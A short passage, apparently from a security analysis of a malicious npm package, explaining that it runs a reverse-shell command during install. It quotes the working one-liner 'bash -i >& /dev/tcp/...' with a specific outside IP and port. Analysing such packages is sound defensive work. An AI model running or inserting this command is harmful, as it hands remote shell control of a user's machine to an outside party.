Specifically, it runs 'bash -i >& /dev/tcp/13.250.135.170/2333 0>&1' in the background, which redirects the bash interactive shell's input and output to a remote server, effectively giving the remote server shell access to the machine running the npm install. This is a clear indication of malicious behavior designed to compromise the host system."
